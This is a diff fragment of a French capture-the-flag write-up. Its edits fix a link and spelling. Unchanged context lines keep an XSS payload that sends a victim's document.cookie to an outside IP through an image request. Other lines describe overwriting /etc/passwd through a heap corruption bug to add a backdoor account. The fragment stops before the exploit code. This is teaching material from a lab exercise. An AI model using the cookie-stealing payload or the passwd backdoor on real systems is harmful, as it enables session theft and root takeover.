@@ -69,7 +69,7 @@ version<br />
 
 On sait d'après l'interface qu'un administrateur nommé *malwareadm* existe... Et c'est devenu assez fréquent qu'un comportement humain soit simulé sur les CTFs (merci les browsers headless).  
 
-Pour faire propre j'ai utilisé le même javascript que pour [le CTF RedCross](http://devloop.users.sourceforge.net/index.php?article191/solution-du-ctf-redcross-de-hackthebox) :  
+Pour faire propre j'ai utilisé le même javascript que pour [le CTF RedCross]({% link _posts/2019-04-13-Solution-du-CTF-RedCross-de-HackTheBox.md %}) :  
 
 ```javascript
 <script>var img = document.createElement("img"); img.src = "http://192.168.3.254:8000/?" + encodeURI(document.cookie); document.body.appendChild(img);</script>
@@ -207,11 +207,11 @@ f7f50000-f7f51000 rw-p 00023000 fd:01 9306251                            /lib/i3
 ff8a2000-ff8c3000 rw-p 00000000 00:00 0                                  [stack]
 ```
 
-On a un crash du à la libération du chunk corrompu à la fin mais le mal est fait.  
+On a un crash dû à la libération du chunk corrompu à la fin mais le mal est fait.  
 
 On peut écrire dans */etc/passwd* pour l'exploitation, seulement le path destination doit aussi correspondre au shell qui sera exécuté lorsque l'on se connectera avec le compte ajouté.  
 
-La solution que j'ai utilisé est de spécifier une ligne de */etc/passwd* où le shell correspondra à */tmp/backdoor/etc/passwd*. Avec suffisemment de padding le path écrasé sera */etc/passwd* comme attendu et il nous suffira de copier un bash à l'emplacement */tmp/backdoor/etc/passwd* pour rendre notre compte utilisable.  
+La solution que j'ai utilisé est de spécifier une ligne de */etc/passwd* où le shell correspondra à */tmp/backdoor/etc/passwd*. Avec suffisamment de padding le path écrasé sera */etc/passwd* comme attendu et il nous suffira de copier un bash à l'emplacement */tmp/backdoor/etc/passwd* pour rendre notre compte utilisable.  
 
 Voici l'exploit :  
 
